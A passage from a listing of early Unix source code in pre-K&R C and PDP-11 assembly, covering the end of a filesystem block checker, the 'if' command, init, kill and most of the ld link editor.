		}
		check(*argv);
	}
	return(nerror);
}

check(file)
char *file;
{
	register *ip, i, j;

	fi = open(file, sflg?2:0);
	if (fi < 0) {
		printf("cannot open %s\n", file);
		nerror =| 04;
		return;
	}
	printf("%s:\n", file);
	nfile = 0;
	nspcl = 0;
	nlarg = 0;
	nvlarg = 0;
	nindir = 0;
	nvindir = 0;
	ndir = 0;
	nused = 0;
	nfree = 0;
	ndup = 0;
	for (ip = bmap; ip < &bmap[4096];)
		*ip++ = 0;
	sync();
	bread(1, &sblock, 512);
	nifiles = sblock.s_isize*16;
	for(i=0; ino < nifiles; i =+ NINODE/16) {
		bread(i+2, inode, sizeof inode);
		for(j=0; j<NINODE && ino<nifiles; j++) {
			ino++;
			pass1(&inode[j]);
		}
	}
	ino = 0;
	sync();
	bread(1, &sblock, 512);
	if (sflg) {
		makefree();
		return;
	}
	while(i = alloc()) {
		if (chk(i, "free"))
			break;
		nfree++;
	}
	if (ndup) {
		printf("%l dups in free\n", ndup);
		nerror =| 02;
	}
	j = 0;
	for (ip = bmap; ip < &bmap[4096];) {
		i = *ip++;
		while (i) {
			if (i<0)
				j--;
			i =<< 1;
		}
	}
	j =+ sblock.s_fsize - sblock.s_isize - 2;
	if (j)
		printf("missing%5l\n", j);
	printf("spcl  %6l\n", nspcl);
	printf("files %6l\n", nfile);
	printf("large %6l\n", nlarg);
	if (nvlarg)
		printf("huge  %6l\n", nvlarg);
	printf("direc %6l\n", ndir);
	printf("indir %6l\n", nindir);
	if (nvindir)
		printf("indir2%6l\n", nvindir);
	printf("used  %6l\n", nused);
	printf("free  %6l\n", nfree);
	close(fi);
}

pass1(aip)
struct inode *aip;
{
	int buf[256], vbuf[256];
	register i, j, *ip;

	ip = aip;
	if ((ip->i_mode&IALLOC) == 0)
		return;
	if ((ip->i_mode&IFCHR&IFBLK) != 0) {
		nspcl++;
		return;
	}
	if ((ip->i_mode&IFMT) == IFDIR)
		ndir++;
	else
		nfile++;
	if ((ip->i_mode&ILARG) != 0) {
		nlarg++;
		for(i=0; i<7; i++)
		if (ip->i_addr[i] != 0) {
			nindir++;
			if (chk(ip->i_addr[i], "indirect"))
				continue;
			bread(ip->i_addr[i], buf, 512);
			for(j=0; j<256; j++)
			if (buf[j] != 0)
				chk(buf[j], "data (large)");
		}
		if (ip->i_addr[7]) {
			nvlarg++;
			if (chk(ip->i_addr[7], "indirect"))
				return;
			bread(ip->i_addr[7], buf, 512);
			for(i=0; i<256; i++)
			if (buf[i] != 0) {
				nvindir++;
				if (chk(buf[i], "2nd indirect"))
					continue;
				bread(buf[i], vbuf, 512);
				for(j=0; j<256; j++)
				if (vbuf[j])
					chk(vbuf[j], "data (very large)");
			}
		}
		return;
	}
	for(i=0; i<8; i++) {
		if (ip->i_addr[i] != 0)
			chk(ip->i_addr[i], "data (small)");
	}
}

chk(ab, s)
char *ab;
{
	register char *b;
	register n, m;

	b = ab;
	if (ino)
		nused++;
	if (b<sblock.s_isize+2 || b>=sblock.s_fsize) {
		printf("%l bad; inode=%l, class=%s\n", b, ino, s);
		return(1);
	}
	m = 1 << (b&017);
	n = (b>>4) & 07777;
	if (bmap[n]&m) {
		printf("%l dup; inode=%l, class=%s\n", b, ino, s);
		ndup++;
	}
	bmap[n] =| m;
	for (n=0; blist[n] != -1; n++)
		if (b == blist[n])
			printf("%l arg; inode=%l, class=%s\n", b, ino, s);
	return(0);
}

alloc()
{
	register b, i;
	int buf[256];

	i = --sblock.s_nfree;
	if (i<0 || i>=100) {
		printf("bad freeblock\n");
		return(0);
	}
	b = sblock.s_free[i];
	if (b == 0)
		return(0);
	if (sblock.s_nfree <= 0) {
		bread(b, buf, 512);
		sblock.s_nfree = buf[0];
		for(i=0; i<100; i++)
			sblock.s_free[i] = buf[i+1];
	}
	return(b);
}

bread(bno, buf, cnt)
int *buf;
{
	register *ip;

	seek(fi, bno, 3);
	if (read(fi, buf, cnt) != cnt) {
		printf("read error %d\n", bno);
		if (sflg) {
			printf("No update\n");
			sflg = 0;
		}
		for (ip = buf; ip < &buf[256];)
			*ip++ = 0;
	}
}

free(in)
{
	register i;
	int buf[256];

	if (sblock.s_nfree >= 100) {
		buf[0] = sblock.s_nfree;
		for(i=0; i<100; i++)
			buf[i+1] = sblock.s_free[i];
		sblock.s_nfree = 0;
		bwrite(in, buf);
	}
	sblock.s_free[sblock.s_nfree++] = in;
}

bwrite(bno, buf)
{

	seek(fi, bno, 3);
	if (write(fi, buf, 512) != 512)
		printf("write error %d\n", bno);
}

number(as)
char *as;
{
	register n, c;
	register char *s;

	s = as;
	n = 0;
	while ((c = *s++) >= '0' && c <= '9') {
		n = n*10+c-'0';
	}
	return(n);
}

makefree()
{
	register i;

	sblock.s_nfree = 0;
	sblock.s_ninode = 0;
	sblock.s_flock = 0;
	sblock.s_ilock = 0;
	sblock.s_fmod = 0;
	free(0);
	for(i=sblock.s_fsize-1; i>=sblock.s_isize+2; i--) {
		if ((bmap[(i>>4)&07777] & (1<<(i&017)))==0)
			free(i);
	}
	bwrite(1, &sblock);
	close(fi);
	sync();
	return;
}
-- /usr/source/s1/if.c mode=0100664 uid=3 gid=3 atime=174923068 mtime=169260572 --
/* if command */

int	ap;
int	ac;
char	**av;

main(argc, argv)
char *argv[];
{

	argv[argc] = 0;
	ac = argc; av = argv; ap = 1;
	if (argc<2) return;
	if (exp()) 
		if(doex(0)) {
			write(1, "no command\n", 11);
			seek(0, 0, 2);
		}
}

char *nxtarg() {

	if (ap>ac) return(0*ap++);
	return(av[ap++]);
}

exp(s) {
	int p1;

	p1 = e1();
	if (eq(nxtarg(), "-o")) return(p1 | exp());
	ap--;
	return(p1);
}

e1() {
	int p1;

	p1 = e2();
	if (eq(nxtarg(), "-a")) return (p1 & e1());
	ap--;
	return(p1);
}

e2() {
	if (eq(nxtarg(), "!"))
		return(!e3());
	ap--;
	return(e3());
}

e3() {
	int p1, ccode;
	register char *a;

	ccode = 0;
	if ((a=nxtarg())==0) goto err;
	if(eq(a, "(")) {
		p1 = exp();
		if(!eq(nxtarg(), ")")) goto err;
		return(p1);
	}

	if(eq(a, "-r"))
		return(tio(nxtarg(), 0));

	if(eq(a, "-w"))
		return(tio(nxtarg(), 1));

	if(eq(a, "-c"))
		return(tcreat(nxtarg()));

	if(eq(a, "{")) { /* execute a command for exit code */
		if(fork()) /*parent*/ wait(&ccode);
		else { /*child*/
			doex(1);
			goto err;
		}
		while((a=nxtarg()) && (!eq(a,"}")));
		return(ccode? 0 : 1);
	}

	p1 = nxtarg();
	if (p1==0) goto err;
	if(eq(p1, "="))
		return(eq(a, nxtarg()));

	if(eq(p1, "!="))
		return(!eq(a, nxtarg()));
err:
	write(1, "if error\n", 9);
	exit(9);
}

tio(a, f) {

	a = open(a, f);
	if (a>=0) {
		close(a);
		return(1);
	}
	return(0);
}

tcreat(a) {
	return(1);
}

eq(a, b)
char *a, *b;
{
	register int i;

	i = 0;
l:
	if(a[i] != b[i])
		return(0);
	if(a[i++] == '\0')
		return(1);
	goto l;
}

doex(earg) {

	register int np, i, c;
	char *nargv[50], *ncom, *na;

	np = 0;
	while (na=nxtarg()) {
		if(earg && eq(na,"}")) break;
		nargv[np++] = na;
	}
	if(earg && (!eq(na, "}"))) return(9);
	nargv[np] = 0;
	if (np==0) return(earg);
	execv(nargv[0], nargv, np);
	i = 0;
	ncom = "/usr/bin/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
	while(c=nargv[0][i])  {
		ncom[9+i++] = c;
	}
	ncom[9+i] = '\0';
	execv(ncom+4, nargv, np);
	execv(ncom, nargv, np);
	return(1);
}
-- /usr/source/s1/init.c mode=0100664 uid=3 gid=3 atime=174923081 mtime=169260572 --
#define	tabsize	20
#define	all	p = &itab[0]; p < &itab[20]; p++
#define	ever	;;
#define	single	0173030
#define	reboot	0173040
char	shell[]	"/bin/sh";
char	minus[]	"-";
char	runc[]	"/etc/rc";
char	init[]	"/etc/init";
char	ifile[]	"/etc/ttys";
char	utmp[]	"/etc/utmp";
char	wtmpf[]	"/usr/adm/wtmp";
char	ctty[]	"/dev/tty8";
int	fi;
struct
{
	int	flag;
	int	line;
	char	coms[2];
} line;
struct	tab
{
	int	pid;
	int	line;
	int	comn;
} itab[tabsize];

struct {
	char	name[8];
	char	tty;
	char	fill;
	int	time[2];
	int	wfill;
} wtmp;

main()
{
	register i;
	register struct tab *p, *q;
	int reset();

	/*
	 * if not single user,
	 * run shell sequence
	 */

	if(getcsw() != single) {
		i = fork();
		if(i == 0) {
			open("/", 0);
			dup(0);
			dup(0);
			execl(shell, shell, runc, 0);
			exit();
		}
		while(wait() != i);
		close(creat(utmp, 0644));
		if ((i = open(wtmpf, 1)) >= 0) {
			seek(i, 0, 2);
			wtmp.tty = '~';
			time(wtmp.time);
			write(i, &wtmp, 16);
			close(i);
		}
	}

	/*
	 * main loop for hangup signal
	 * close all files and
	 * check switches for magic values
	 */

	setexit();
	signal(1, reset);
	for(i=0; i<10; i++)
		close(i);
	switch(getcsw()) {

	case single:
	error:
		termall();
		i = fork();
		if(i == 0) {
			open(ctty, 2);
			dup(0);
			execl(shell, minus, 0);
			exit();
		}
		while(wait() != i);

	case reboot:
		termall();
		execl(init, minus, 0);
		reset();
	}

	/*
	 * open and merge in init file
	 */

	fi = open(ifile, 0);
	q = &itab[0];
	while(rline()) {
		if(line.flag == '0')
			continue;
		for(all)
			if(p->line==line.line || p->line==0) {
				if(p >= q) {
					i = p->pid;
					p->pid = q->pid;
					q->pid = i;
					p->line = q->line;
					p->comn = q->comn;
					q->line = line.line;
					q->coms[0] = line.comn;
					q++;
				}
				break;
			}
	}
	close(fi);
	if(q == &itab[0])
		goto error;
	for(; q < &itab[tabsize]; q++)
		term(q);
	for(all)
		if(p->line != 0 && p->pid == 0)
			dfork(p);
	for(ever) {
		i = wait();
		for(all)
			if(p->pid == i) {
				rmut(p);
				dfork(p);
			}
	}
}

termall()
{
	register struct tab *p;

	for(all)
		term(p);
}

term(ap)
struct tab *ap;
{
	register struct tab *p;

	p = ap;
	if(p->pid != 0) {
		rmut(p);
		kill(p->pid, 9);
	}
	p->pid = 0;
	p->line = 0;
}

rline()
{
	static char c[4];

	if(read(fi, c, 4) != 4 || c[3] != '\n')
		return(0);
	line.flag = c[0];
	line.line = c[1];
	line.comn = c[2];
	return(1);
}

dfork(ap)
struct tab *ap;
{
	register i;
	register char *tty;
	register struct tab *p;

	p = ap;
	i = fork();
	if(i == 0) {
		signal(1, 0);
		tty = "/dev/ttyx";
		tty[8] = p->line;
		chown(tty, 0);
		chmod(tty, 0622);
		open(tty, 2);
		dup(0);
		execl("etc/getty", minus, p->coms, 0);
		exit();
	}
	p->pid = i;
}

rmut(p)
struct tab *p;
{
	register i, f;
	static char zero[16];

	f = open(utmp, 1);
	if(f >= 0) {
		i = p->line;
		if(i >= 'a')
			i =+ '0' + 10 - 'a';
		seek(f, (i-'0')*16, 0);
		write(f, zero, 16);
		close(f);
	}
	f = open(wtmpf, 1);
	if (f >= 0) {
		wtmp.tty = p->line;
		time(wtmp.time);
		seek(f, 0, 2);
		write(f, &wtmp, 16);
		close(f);
	}
}
-- /usr/source/s1/kill.s mode=0100664 uid=3 gid=3 atime=174923094 mtime=169260572 --
/ kill process

	mov	(sp)+,r4
	tst	(sp)+

loop:
	dec	r4
	ble	done
	mov	(sp)+,r5
	clr	r3
	cmpb	(r5),$'-
	bne	1f
	inc	r5
	clr	signo
1:
	movb	(r5)+,r0
	beq	1f
	sub	$'0,r0
	cmp	r0,$9
	bhi	error
	mul	$10.,r3
	add	r0,r3
	br	1b
1:
	tst	signo
	bne	1f
	tst	r3
	ble	error
	cmp	r3,$12.
	bgt	error
	mov	r3,signo
	br	loop
1:
	mov	r3,r0
	sys	37.; signo: 9.		/ kill
	bec	loop
	mov	r3,r0
	jsr	pc,decml
	mov	$1,r0
	sys	write; m1; em1-m1
	br	loop

error:
	mov	$1,r0
	sys	write; m2; em2-m2
	br	loop

done:
	sys	exit

decml:
	mov	r0,r1
	clr	r0
	div	$10.,r0
	mov	r1,-(sp)
	tst	r0
	beq	1f
	jsr	pc,decml
1:
	mov	(sp)+,r0
	add	$'0,r0
	mov	r0,ch
	mov	$1,r0
	sys	write; ch; 1
	rts	pc

m1:
	<: not found\n>
em1:
m2:
	<non-numeric arg\n>
em2:
.bss
ch:	.=.+2
-- /usr/source/s1/ld.c mode=0110664 uid=3 gid=3 atime=174923100 mtime=174845349 --
#
/*
 *  link editor
 */

#define	SIGINT	2
#define	ARCMAGIC 0177555
#define	FMAGIC	0407
#define	NMAGIC	0410
#define	IMAGIC	0411

#define	EXTERN	040
#define	UNDEF	00
#define	ABS	01
#define	TEXT	02
#define	DATA	03
#define	BSS	04
#define	COMM	05	/* internal use only */

#define	RABS	00
#define	RTEXT	02
#define	RDATA	04
#define	RBSS	06
#define	REXT	010

#define	RELFLG	01
#define	NROUT	256
#define	NSYM	501
#define	NSYMPR	500

#define	RONLY	0400

char	premeof[] "Premature EOF on %s";

struct	page {
	int	nuser;
	int	bno;
	int	nibuf;
	int	buff[256];
} page[2];

struct	{
	int	nuser;
	int	bno;
} fpage;

struct	stream {
	int	*ptr;
	int	bno;
	int	nibuf;
	int	size;
	struct	page *pno;
};

struct	stream text;
struct	stream reloc;

struct	archdr {
	char	aname[8];
	int	atime[2];
	char	auid, amode;
	int	asize;
} archdr;

struct	filhdr {
	int	fmagic;
	int	tsize;
	int	dsize;
	int	bsize;
	int	ssize;
	int	entry;
	int	pad;
	int	relflg;
} filhdr;

struct	liblist {
	int	off;
	int	bno;
};

struct	liblist	liblist[NROUT];
struct	liblist	*libp { &liblist[0] };

struct	symbol {
	char	sname[8];
	char	stype;
	char	spad;
	int	svalue;
};

struct	symbol	cursym;
struct	symbol	symtab[NSYM];
struct	symbol	*hshtab[NSYM+2];
struct	symbol	*symp { symtab };
struct	symbol	**local[NSYMPR];
struct	symbol	*p_etext;
struct	symbol	*p_edata;
struct	symbol	*p_end;

int	xflag;		/* discard local symbols */
int	Xflag;		/* discard locals starting with 'L' */
int	rflag;		/* preserve relocation bits, don't define common */
int	arflag;		/* original copy of rflag */
int	sflag;		/* discard all symbols */
int	nflag;		/* pure procedure */
int	dflag;		/* define common even with rflag */
int	iflag;		/* I/D space separated */

int	infil;
char	*filname;

int	tsize;
int	dsize;
int	bsize;
int	ssize;
int	nsym;

int	torigin;
int	dorigin;
int	borigin;

int	ctrel;
int	cdrel;
int	cbrel;

int	errlev;
int	delarg	4;
char	tfname[]	"/tmp/lxyyyyy";
int	toutb[259];
int	doutb[259];
int	troutb[259];
int	droutb[259];
int	soutb[259];

struct	symbol	**lookup();
struct	symbol	**slookup();

main(argc, argv)
char **argv;
{
	extern int delexit();
	register c;
	register char *ap, **p;
	struct symbol **hp;

	if ((signal(SIGINT, 1) & 01) == 0)
		signal(SIGINT, delexit);
	if (argc == 1)
		exit(4);
	p = argv + 1;
	for (c = 1; c<argc; c++) {
		filname = 0;
		ap = *p++;
		if (*ap == '-') switch (ap[1]) {

		case 'u':
			if (++c >= argc)
				error(1, "Bad 'use'");
			if (*(hp = slookup(*p++)) == 0) {
				*hp = symp;
				enter();
			}
			continue;

		case 'l':
			break;

		case 'x':
			xflag++;
			continue;

		case 'X':
			Xflag++;
			continue;

		case 'r':
			rflag++;
			arflag++;
			continue;

		case 's':
			sflag++;
			xflag++;
			continue;

		case 'n':
			nflag++;
			continue;

		case 'd':
			dflag++;
			continue;

		case 'i':
			iflag++;
			continue;
		}
		load1arg(ap);
		close(infil);
	}
	middle();
	setupout();
	p = argv+1;
	libp = liblist;
	for (c=1; c<argc; c++) {
		ap = *p++;
		if (*ap == '-') switch (ap[1]) {

		case 'u':
			++c;
			++p;
		default:
			continue;

		case 'l':
			break;
		}
		load2arg(ap);
		close(infil);
	}
	finishout();
}

load1arg(acp)
char *acp;
{
	register char *cp;
	register noff, nbno;

	cp = acp;
	if (getfile(cp)==0) {
		load1(0, 0, 0);
		return;
	}
	nbno = 0;
	noff = 1;
	for (;;) {
		dseek(&text, nbno, noff, sizeof archdr);
		if (text.size <= 0) {
			libp->bno = -1;
			libp++;
			return;
		}
		mget(&archdr, sizeof archdr);
		if (load1(1, nbno, noff + (sizeof archdr) / 2)) {
			libp->bno = nbno;
			libp->off = noff;
			libp++;
		}
		noff =+ (archdr.asize + sizeof archdr)>>1;
		nbno =+ (noff >> 8) & 0377;
		noff =& 0377;
	}
}

load1(libflg, bno, off)
{
	register struct symbol *sp, **hp, ***cp;
	struct symbol *ssymp;
	int ndef, nloc;

	readhdr(bno, off);
	ctrel = tsize;
	cdrel =+ dsize;
	cbrel =+ bsize;
	ndef = 0;
	nloc = sizeof cursym;
	cp = local;
	ssymp = symp;
	if ((filhdr.relflg&RELFLG)==1) {
		error(0, "No relocation bits");
		return(0);
	}
	off =+ (sizeof filhdr)/2 + filhdr.tsize + filhdr.dsize;
	dseek(&text, bno, off, filhdr.ssize);
	while (text.size > 0) {
		mget(&cursym, sizeof cursym);
		if ((cursym.stype&EXTERN)==0) {
			if (Xflag==0 || cursym.sname[0]!='L')
				nloc =+ sizeof cursym;
			continue;
		}
		symreloc();
		hp = lookup();
		if ((sp = *hp) == 0) {
			*hp = enter();
			*cp++ = hp;
			continue;
		}
		if (sp->stype != EXTERN+UNDEF)
			continue;
		if (cursym.stype == EXTERN+UNDEF) {
			if (cursym.svalue > sp->svalue)
				sp->svalue = cursym.svalue;
			continue;
		}
		if (sp->svalue != 0 && cursym.stype == EXTERN+TEXT)
			continue;
		ndef++;
		sp->stype = cursym.stype;
		sp->svalue = cursym.svalue;
	}
	if (libflg==0 || ndef) {
		tsize =+ filhdr.tsize;
		dsize =+ filhdr.dsize;
		bsize =+ filhdr.bsize;
		ssize =+ nloc;
		return(1);
	}
/*
 * No symbols defined by this library member.
 * Rip out the hash table entries and reset the symbol table.
 */
	symp = ssymp;
	while (cp > local)
		**--cp = 0;
	return(0);
}

middle()
{
	register struct symbol *sp;
	register t, csize;
	int nund, corigin;

	p_etext = *slookup("_etext");
	p_edata = *slookup("_edata");
	p_end = *slookup("_end");
/*
 * If there are any undefined symbols, save the relocation bits.
 */
	if (rflag==0) for (sp=symtab; sp<symp; sp++)
		if (sp->stype==EXTERN+UNDEF && sp->svalue==0
		 && sp!=p_end && sp!=p_edata && sp!=p_etext) {
			rflag++;
			dflag = 0;
			nflag = 0;
			iflag = 0;
			sflag = 0;
			break;
		}
/*
 * Assign common locations.
 */
	csize = 0;
	if (dflag || rflag==0) {
		for (sp=symtab; sp<symp; sp++)
			if (sp->stype==EXTERN+UNDEF && (t=sp->svalue)!=0) {
				t = (t+1) & ~01;
				sp->svalue = csize;
				sp->stype = EXTERN+COMM;
				csize =+ t;
			}
		if (p_etext && p_etext->stype==EXTERN+UNDEF) {
			p_etext->stype = EXTERN+TEXT;
			p_etext->svalue = tsize;
		}
		if (p_edata && p_edata->stype==EXTERN+UNDEF) {
			p_edata->stype = EXTERN+DATA;
			p_edata->svalue = dsize;
		}
		if (p_end && p_end->stype==EXTERN+UNDEF) {
			p_end->stype = EXTERN+BSS;
			p_end->svalue = bsize;
		}
	}
/*
 * Now set symbols to their final value
 */
	if (nflag || iflag)
		tsize = (tsize + 077) & ~077;
	dorigin = tsize;
	if (nflag)
		dorigin = (tsize+017777) & ~017777;
	if (iflag)
		dorigin = 0;
	corigin = dorigin + dsize;
	borigin = corigin + csize;
	nund = 0;
	for (sp=symtab; sp<symp; sp++) switch (sp->stype) {
	case EXTERN+UNDEF:
		errlev =| 01;
		if (arflag==0 && sp->svalue==0) {
			if (nund==0)
				printf("Undefined:\n");
			nund++;
			printf("%.8s\n", sp->sname);
		}
		continue;

	case EXTERN+ABS:
	default:
		continue;

	case EXTERN+TEXT:
		sp->svalue =+ torigin;
		continue;

	case EXTERN+DATA:
		sp->svalue =+ dorigin;
		continue;

	case EXTERN+BSS:
		sp->svalue =+ borigin;
		continue;

	case EXTERN+COMM:
		sp->stype = EXTERN+BSS;
		sp->svalue =+ corigin;
		continue;
	}
	if (sflag || xflag)
		ssize = 0;
	bsize =+ csize;
	nsym = ssize / (sizeof cursym);
}

setupout()
{
	register char *p;
	register pid;

	if ((toutb[0] = creat("l.out", 0666)) < 0)
		error(1, "Can't create l.out");
	pid = getpid();
	for (p = &tfname[12]; p > &tfname[7];) {
		*--p = (pid&07) + '0';
		pid =>> 3;
	}
	tcreat(doutb, 'a');
	if (sflag==0 || xflag==0)
		tcreat(soutb, 'b');
	if (rflag) {
		tcreat(troutb, 'c');
		tcreat(droutb, 'd');
	}
	filhdr.fmagic = FMAGIC;
	if (nflag)
		filhdr.fmagic = NMAGIC;
	if (iflag)
		filhdr.fmagic = IMAGIC;
	filhdr.tsize = tsize;
	filhdr.dsize = dsize;
	filhdr.bsize = bsize;
	filhdr.ssize = sflag? 0: (ssize + (sizeof cursym)*(symp-symtab));
	filhdr.entry = 0;
	filhdr.pad = 0;
	filhdr.relflg = (rflag==0);
	mput(toutb, &filhdr, sizeof filhdr);
	return;
}

tcreat(buf, letter)
int *buf;
{
	tfname[6] = letter;
	if ((buf[0] = creat(tfname, RONLY)) < 0)
		error(1, "Can't create temp");
}

load2arg(acp)
char *acp;
{
	register char *cp;
	register struct liblist *lp;

	cp = acp;
	if (getfile(cp) == 0) {
		while (*cp)
			cp++;
		while (cp >= acp && *--cp != '/');
		mkfsym(++cp);
		load2(0, 0);
		return;
	}
	for (lp = libp; lp->bno != -1; lp++) {
		dseek(&text, lp->bno, lp->off, sizeof archdr);
		mget(&archdr, sizeof archdr);
		mkfsym(archdr.aname);
		load2(lp->bno, lp->off + (sizeof archdr) / 2);
	}
	libp = ++lp;
}

load2(bno, off)
{
	register struct symbol *sp;
	register int *lp, symno;

	readhdr(bno, off);
	ctrel = torigin;
	cdrel =+ dorigin;
	cbrel =+ borigin;
/*
 * Reread the symbol table, recording the numbering
 * of symbols for fixing external references.
 */
	lp = local;
	symno = -1;
	off =+ (sizeof filhdr)/2;
	dseek(&text, bno, off+filhdr.tsize+filhdr.dsize, filhdr.ssize);
	while (text.size > 0) {
		symno++;
		mget(&cursym, sizeof cursym);
		symreloc();
		if ((cursym.stype&EXTERN) == 0) {
			if (!sflag&&!xflag&&(!Xflag||cursym.sname[0]!='L'))
				mput(soutb, &cursym, sizeof cursym);
			continue;
		}
		if ((sp = *lookup()) == 0)
			error(1, "internal error: symbol not found");
		if (cursym.stype == EXTERN+UNDEF) {
			if (lp >= &local[NSYMPR])
				error(1, "Local symbol overflow");
			*lp++ = symno;
			*lp++ = sp;
			continue;
		}
		if (cursym.stype!=sp->stype || cursym.svalue!=sp->svalue) {
			printf("%.8s: ", cursym.sname);
			error(0, "Multiply defined");
		}
	}
	dseek(&text, bno, off, filhdr.tsize);
	dseek(&reloc, bno, off+(filhdr.tsize+filhdr.dsize)/2, filhdr.tsize);
	load2td(lp, ctrel, toutb, troutb);
	dseek(&text, bno, off+(filhdr.tsize/2), filhdr.dsize);
	dseek(&reloc, bno, off+filhdr.tsize+(filhdr.dsize/2), filhdr.dsize);
	load2td(lp, cdrel, doutb, droutb);
	torigin =+ filhdr.tsize;
	dorigin =+ filhdr.dsize;
	borigin =+ filhdr.bsize;
}

load2td(lp, creloc, b1, b2)
int *lp;
{
	register r, t;
	register struct symbol *sp;

	for (;;) {
	/*
	 * The pickup code is copied from "get" for speed.
	 */
		if (--text.size <= 0) {
			if (text.size < 0)
				break;
			text.size++;
			t = get(&text);
		} else if (--text.nibuf < 0) {
			text.nibuf++;
			text.size++;
			t = get(&text);
		} else
			t = *text.ptr++;
		if (--reloc.size <= 0) {
			if (reloc.size < 0)
				error(1, "Relocation error");
			reloc.size++;
			r = get(&reloc);
		} else if (--reloc.nibuf < 0) {
			reloc.nibuf++;
			reloc.size++;
			r = get(&reloc);
		} else
			r = *reloc.ptr++;
		switch (r&016) {

		case RTEXT:
			t =+ ctrel;
			break;

		case RDATA:
			t =+ cdrel;
			break;

		case RBSS:
			t =+ cbrel;
			break;

		case REXT:
			sp = lookloc(lp, r);
			if (sp->stype==EXTERN+UNDEF) {
				r = (r&01) + ((nsym+(sp-symtab))<<4) + REXT;
				break;
			}
			t =+ sp->svalue;
			r = (r&01) + ((sp->stype-(EXTERN+ABS))<<1);
			break;
		}
		if (r&01)
			t =- creloc;
		putw(t, b1);
		if (rflag)
			putw(r, b2);
	}
}

finishout()
{
	register n, *p;

	if (nflag||iflag) {
		n = torigin;
		while (n&077) {
			n =+ 2;
			putw(0, toutb);
			if (rflag)
				putw(0, troutb);
		}
	}
	copy(doutb, 'a');
	if (rflag) {
		copy(troutb, 'c');
		copy(droutb, 'd');
	}
	if (sflag==0) {
		if (xflag==0)
			copy(soutb, 'b');
		for (p=symtab; p < symp;)
			putw(*p++, toutb);
	}
	fflush(toutb);
	close(toutb[0]);
	unlink("a.out");
	link("l.out", "a.out");
	delarg = errlev;
	delexit();
}

delexit()
{
	register c;

	unlink("l.out");
	for (c = 'a'; c <= 'd'; c++) {
		tfname[6] = c;
		unlink(tfname);
	}
	if (delarg==0)
		chmod("a.out", 0777);
	exit(delarg);
}

copy(buf, c)
int *buf;
{
	register f, *p, n;

	fflush(buf);
	close(buf[0]);
	tfname[6] = c;
	f = open(tfname, 0);
	while ((n = read(f, doutb, 512)) > 1) {
		n =>> 1;
		p = doutb;
		do
			putw(*p++, toutb);
		while (--n);
	}
	close(f);
}

mkfsym(s)
char *s;
{

	if (sflag || xflag)
		return;
	cp8c(s, cursym.sname);
	cursym.stype = 037;
	cursym.svalue = torigin;
	mput(soutb, &cursym, sizeof cursym);
}

mget(aloc, an)
int *aloc;
{
	register *loc, n;
	register *p;

	n = an;
	n =>> 1;
	loc = aloc;
	if ((text.nibuf =- n) >= 0) {
		if ((text.size =- n) > 0) {
			p = text.ptr;
			do
				*loc++ = *p++;
			while (--n);
			text.ptr = p;
			return;
		} else
			text.size =+ n;
	}
	text.nibuf =+ n;
	do {
		*loc++ = get(&text);
	} while (--n);
}

mput(buf, aloc, an)
int *aloc;
{
	register *loc;
	register n;

	loc = aloc;
	n = an>>1;
	do {
		putw(*loc++, buf);
	} while (--n);
}

dseek(asp, ab, o, s)
{
	register struct stream *sp;
	register struct page *p;
	register b;
	int n;

	sp = asp;
	b = ab + ((o>>8) & 0377);
	o =& 0377;
	--sp->pno->nuser;
	if ((p = &page[0])->bno!=b && (p = &page[1])->bno!=b)
		if (p->nuser==0 || (p = &page[0])->nuser==0) {
			if (page[0].nuser==0 && page[1].nuser==0)
				if (page[0].bno < page[1].bno)
					p = &page[0];
			p->bno = b;
			seek(infil, b, 3);
			if ((n = read(infil, p->buff, 512)>>1) < 0)
				n = 0;
			p->nibuf = n;
		} else
			error(1, "No pages");
	++p->nuser;
	sp->bno = b;
	sp->pno = p;
	sp->ptr = p->buff + o;
	if (s != -1)
		sp->size = (s>>1) & 077777;
	if ((sp->nibuf = p->nibuf-o) <= 0)
		sp->size = 0;
}

get(asp)
struct stream *asp;
{
	register struct stream *sp;

	sp = asp;
	if (--sp->nibuf < 0) {
		dseek(sp, sp->bno+1, 0, -1);
		--sp->nibuf;
	}
	if (--sp->size <= 0) {
		if (sp->size < 0)
			error(1, premeof);
		++fpage.nuser;
		--sp->pno->nuser;
		sp->pno = &fpage;
	}
	return(*sp->ptr++);
}

getfile(acp)
char *acp;
{
	register char *cp;
	register c;

	cp = acp;
	archdr.aname[0] = '\0';
	if (cp[0]=='-' && cp[1]=='l') {
		if ((c = cp[2]) == '\0')
			c = 'a';
		cp = "/lib/lib?.a";
		cp[8] = c;
	}
	filname = cp;
	if ((infil = open(cp, 0)) < 0)
		error(1, "cannot open");
	page[0].bno = page[1].bno = -1;
	page[0].nuser = page[1].nuser = 0;
	text.pno = reloc.pno = &fpage;
	fpage.nuser = 2;
	dseek(&text, 0, 0, 2);
	if (text.size <= 0)
		error(1, premeof);
	return(get(&text) == ARCMAGIC);
}

struct symbol **lookup()
{
	int i;
	register struct symbol **hp;
	register char *cp, *cp1;

	i = 0;
	for (cp=cursym.sname; cp < &cursym.sname[8];)
		i = (i<<1) + *cp++;
	for (hp = &hshtab[(i&077777)%NSYM+2]; *hp!=0;) {
		cp1 = (*hp)->sname;
		for (cp=cursym.sname; cp < &cursym.sname[8];)
			if (*cp++ != *cp1++)
				goto no;
		break;
	    no:
		if (++hp >= &hshtab[NSYM+2])
			hp = hshtab;
	}
	return(hp);
}

struct symbol **slookup(s)
char *s;
{
	cp8c(s, cursym.sname);
	cursym.stype = EXTERN+UNDEF;
	cursym.svalue = 0;
	return(lookup());
}

enter()
{
	register struct symbol *sp;
	
	if ((sp=symp) >= &symtab[NSYM])
		error(1, "Symbol table overflow");
	cp8c(cursym.sname, sp->sname);
	sp->stype = cursym.stype;
	sp->svalue = cursym.svalue;
	symp++;
	return(sp);
}

symreloc()
{
	switch (cursym.stype) {

	case TEXT:
	case EXTERN+TEXT:
		cursym.svalue =+ ctrel;
		return;

	case DATA:
	case EXTERN+DATA:
		cursym.svalue =+ cdrel;
		return;

	case BSS:
	case EXTERN+BSS:
		cursym.svalue =+ cbrel;
		return;

	case EXTERN+UNDEF:
		return;
	}
	if (cursym.stype&EXTERN)
		cursym.stype = EXTERN+ABS;
}

error(n, s)
char *s;
{
	if (filname) {
		printf("%s", filname);
		if (archdr.aname[0])
			printf("(%.8s)", archdr.aname);
		printf(": ");
	}
	printf("%s\n", s);
	if (n)
		delexit();
	errlev = 2;
}

lookloc(alp, r)
{
	register int *clp, *lp;
	register sn;

	lp = alp;
	sn = (r>>4) & 07777;
	for (clp=local; clp<lp; clp =+ 2)
		if (clp[0] == sn)
			return(clp[1]);
	error(1, "Local symbol botch");
}

readhdr(bno, off)
